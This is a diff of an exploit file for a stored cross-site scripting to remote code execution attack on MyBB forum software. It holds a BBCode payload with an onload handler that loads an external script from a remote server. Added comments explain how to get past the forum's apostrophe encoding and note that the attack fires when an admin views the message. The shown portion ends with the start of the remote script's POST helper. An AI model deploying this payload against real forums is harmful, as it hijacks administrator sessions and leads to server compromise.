@@ -9,13 +9,16 @@
 # Blog: https://blog.ripstech.com/2019/mybb-stored-xss-to-rce/
 
 Payload: [video=youtube]http://test/test#[url]onload='script=document.createElement(%22script%22);script.src=%22https://giovan.nl/mybb.js%22;document.body.append(script);'//[/url][/video]
-NOTE: This payload fetches another JS file (mybb.js), hosted on a VPS.
-*/
+This payload fetches another JS file (mybb.js), hosted on a VPS.
 
+NOTE: Mybb's textbox will dynamically change apostrophes (') to &#39; . To fix this just manually change them back to apostrophes and hit 'send'. 
+The payload will trigger once an admin views the message.
+*/
 
 /*
  * mybb.js
  */
+
 function postReq(toUrl,body,setHeaders = true){
 	var xhr = new XMLHttpRequest();
 	xhr.open("POST",toUrl,false);
